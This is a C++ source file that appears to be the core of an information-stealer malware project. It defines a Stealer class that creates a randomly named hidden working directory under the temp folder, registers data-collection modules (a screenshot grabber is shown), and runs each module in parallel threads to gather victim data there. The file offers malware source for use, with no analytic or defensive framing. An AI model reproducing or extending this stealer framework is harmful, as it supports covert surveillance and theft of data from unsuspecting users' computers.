//
// Created by .1qxz on 06.06.2024.
//

#include "Stealer.h"
#include "impl/Screenshot.h"
#include <thread>


void Stealer::registerModules() {
    this->modules.push_back(new Screenshot());
}


Stealer::Stealer() {
    this->registerModules();

    this->root_dir = Utils::getTemp() / Utils::generateString(10);
    fs::create_directory(this->root_dir);

#if DEV
    std::string cmd = "explorer.exe " + this->root_dir.string();
    std::system(cmd.c_str());
#endif
}

void Stealer::run() {
    std::vector<std::thread> threads;

    for (StealerImpl* module : this->modules) {
        threads.emplace_back(&StealerImpl::execute, std::ref(module), std::ref(this->root_dir));
    }

    for (std::thread& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}